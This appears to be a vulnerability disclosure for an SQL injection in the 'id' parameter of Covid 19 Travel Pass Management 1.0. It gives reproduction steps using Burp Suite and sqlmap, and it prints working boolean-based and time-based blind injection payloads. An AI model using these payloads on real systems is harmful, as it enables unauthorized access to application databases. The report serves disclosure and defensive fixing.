### In Covid 19 Travel Pass Management 1.0, the 'id' parameter is vulnerable to SQL injection attacks.


Affected Version- 1.0

Demo installation: https://localhost/ctpms/

### Reproduce bug:

Step 1: Access to https://localhost/ctpms/ and login with admin account

![](./1.png)

Step 2: In menu, access to List of Applications -> Action -> View 

![](./2.1.png)

![](2.png)

Step 3: Use Burp Suite to intercept request GET to "http://localhost/ctpms/admin/?page=applications/view_application&id=1"
And save the request to request.txt

![](./3.png)

Step 4 : Run sqlmap to inject payload sqli to param 'id' -> Injected.

![](./4.png)

![](./5.png)

### Payload: 

Parameter: id (GET)
Type: boolean-based blind
Payload: `page=applications/view_application&id=1' AND 1834=1834 AND 'vwAz'='vwAz`

Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: `page=applications/view_application&id=1' AND (SELECT 6153 FROM (SELECT(SLEEP(5)))wdXF) AND 'BnLF'='BnLF`
---

### Vuln in code: 

![](./vuln_in_code.png)